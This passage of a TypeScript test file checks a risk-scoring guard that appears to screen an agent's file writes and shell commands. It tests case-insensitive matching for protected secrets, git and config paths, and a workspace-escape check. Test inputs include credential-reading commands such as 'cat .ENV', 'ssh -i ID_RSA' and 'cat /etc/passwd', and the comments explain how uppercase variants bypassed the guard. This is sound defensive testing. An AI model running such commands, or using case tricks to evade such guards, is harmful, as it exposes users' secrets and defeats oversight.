    { file: "src/.Env", why: "mixed case dotenv in subdir" },
    { file: "config/.ENV.production", why: "uppercase dotenv variant" },
    { file: ".GIT/HEAD", why: "uppercase git dir" },
    { file: "repo/.Git/config", why: "mixed case git dir" },
    { file: "ID_RSA", why: "uppercase rsa key basename" },
    { file: "home/ID_Ed25519", why: "mixed case ed25519 key" },
    { file: "Server.PEM", why: "uppercase pem extension" },
    { file: ".SSH/id_rsa", why: "uppercase ssh dir" },
    { file: "Home/.Ssh/Config", why: "mixed case ssh dir" },
    { file: "SECRETS/db.json", why: "uppercase secrets" },
    { file: "Config/CREDENTIALS.json", why: "uppercase credentials" },
  ];
  for (const c of cases) {
    test(`flags protected file regardless of case: ${c.file} (${c.why})`, () => {
      const r = scoreRisk({ event: "pre-write", files: [c.file] });
      expect(["high", "critical"]).toContain(r.risk);
    });
  }

  // Regression: lowercase canonical forms must still match (the original
  // behavior must not break).
  const lowerCases = [".env", ".git/HEAD", "id_rsa", "server.pem", ".ssh/id_rsa"];
  for (const f of lowerCases) {
    test(`regression: still blocks lowercase canonical: ${f}`, () => {
      const r = scoreRisk({ event: "pre-write", files: [f] });
      expect(["high", "critical"]).toContain(r.risk);
    });
  }
});

// --- ISSUE #121 #122 #123: SECRET_CRITICAL regex case-insensitivity ---
// SECRET_CRITICAL patterns (.env, id_rsa, id_ed25519) are tested against
// command text (scoreCommand → protect-secrets). Without /i, uppercase
// variants bypass the guard: `cat .ENV`, `ssh -i ID_RSA`, etc.
describe("risk: SECRET_CRITICAL case-insensitive command matching (issue #121-#123)", () => {
  const cases: Array<{ cmd: string; why: string }> = [
    { cmd: "cat .ENV", why: "uppercase dotenv in command" },
    { cmd: "cat config/.ENV.production", why: "uppercase dotenv variant in command" },
    { cmd: "cat ID_RSA", why: "uppercase rsa key in command" },
    { cmd: "ssh -i ID_ED25519 host", why: "uppercase ed25519 key in command" },
    { cmd: "cat .Env", why: "mixed case dotenv in command" },
    { cmd: "cat Id_Rsa", why: "mixed case rsa key in command" },
  ];
  for (const c of cases) {
    test(`flags secret in command regardless of case: ${c.cmd} (${c.why})`, () => {
      const r = scoreRisk({ event: "pre-command", command: c.cmd });
      expect(r.risk).toBe("critical");
      expect(r.reasons.some((s) => s.includes("secret"))).toBe(true);
    });
  }

  // Regression: lowercase canonical forms must still match.
  const lowerCases = ["cat .env", "cat id_rsa", "ssh -i id_ed25519 host"];
  for (const cmd of lowerCases) {
    test(`regression: still blocks lowercase secret in command: ${cmd}`, () => {
      const r = scoreRisk({ event: "pre-command", command: cmd });
      expect(r.risk).toBe("critical");
      expect(r.reasons.some((s) => s.includes("secret"))).toBe(true);
    });
  }
});

// --- ISSUE #121: CONFIG_PROTECTED regex case-insensitivity ---
// CONFIG_PROTECTED patterns (tsconfig, biome.jsonc, .githooks, .eslintrc,
// .prettierrc) are tested against file paths (scoreFiles → protect-config).
// Without /i, uppercase variants bypass the file-based guard.
describe("risk: CONFIG_PROTECTED case-insensitive file matching (issue #121)", () => {
  const cases: Array<{ file: string; why: string }> = [
    { file: "TSCONFIG.JSON", why: "uppercase tsconfig" },
    { file: "src/TsConfig.Build.json", why: "mixed case tsconfig variant" },
    { file: "Biome.jsonc", why: "mixed case biome config" },
    { file: "BIOME.json", why: "uppercase biome config" },
    { file: ".GITHOOKS/pre-commit", why: "uppercase githooks dir" },
    { file: "repo/.Githooks/post-merge", why: "mixed case githooks dir" },
    { file: ".ESLINTRC", why: "uppercase eslintrc" },
    { file: "src/.Eslintrc.json", why: "mixed case eslintrc" },
    { file: ".PRETTIERRC", why: "uppercase prettierrc" },
    { file: "lib/.PrettierRc.yaml", why: "mixed case prettierrc" },
  ];
  for (const c of cases) {
    test(`flags protected config file regardless of case: ${c.file} (${c.why})`, () => {
      const r = scoreRisk({ event: "pre-write", files: [c.file] });
      expect(r.risk).toBe("high");
      expect(r.reasons.some((s) => s.includes("config"))).toBe(true);
    });
  }

  // Regression: lowercase canonical forms must still match.
  const lowerCases = [
    "tsconfig.json",
    "biome.jsonc",
    ".githooks/pre-commit",
    ".eslintrc",
    ".prettierrc",
  ];
  for (const f of lowerCases) {
    test(`regression: still blocks lowercase config: ${f}`, () => {
      const r = scoreRisk({ event: "pre-write", files: [f] });
      expect(r.risk).toBe("high");
    });
  }
});

// --- ISSUE #121: SECRET_HIGH .pem missing /i flag ---
// The `.pem` entry in SECRET_HIGH lacks /i, so `Server.PEM` bypasses.
describe("risk: SECRET_HIGH .pem case-insensitive command matching (issue #121)", () => {
  test("flags .PEM in command", () => {
    const r = scoreRisk({ event: "pre-command", command: "cat Server.PEM" });
    expect(r.risk).toBe("high");
    expect(r.reasons.some((s) => s.includes("secret"))).toBe(true);
  });

  test("regression: still blocks lowercase .pem", () => {
    const r = scoreRisk({ event: "pre-command", command: "cat server.pem" });
    expect(r.risk).toBe("high");
    expect(r.reasons.some((s) => s.includes("secret"))).toBe(true);
  });
});

// --- ISSUE #123: escapesWorkspace case-fold path containment ---
// On case-insensitive filesystems (macOS default), a path that differs
// only in case from the workspace root is still inside the workspace.
// escapesWorkspace must compare case-insensitively.
describe("risk: escapesWorkspace case-fold path containment (issue #123)", () => {
  test("case-different path within workspace is NOT flagged as escape", () => {
    // Simulate macOS: /Users/linhn/VF-ORCH-BATCH1 is the same dir as /Users/linhn/vf-orch-batch1
    const r = scoreRisk({
      event: "pre-command",
      command: "cat /USERS/LINHN/VF-ORCH-BATCH1/src/file.ts",
      workspace: "/Users/linhn/vf-orch-batch1",
    });
    expect(r.reasons.some((s) => s.includes("outside workspace"))).toBe(false);
  });

  test("truly outside path still flagged", () => {
    const r = scoreRisk({
      event: "pre-command",
      command: "cat /etc/passwd",
      workspace: "/Users/linhn/vf-orch-batch1",
    });
    expect(r.reasons.some((s) => s.includes("outside workspace"))).toBe(true);
  });

  test("regression: exact-case escape still caught", () => {
    const r = scoreRisk({
      event: "pre-command",
      command: "cat ../../outside.txt",
      workspace: "/Users/linhn/vf-orch-batch1",
    });
    expect(r.reasons.some((s) => s.includes("outside workspace"))).toBe(true);
  });
});
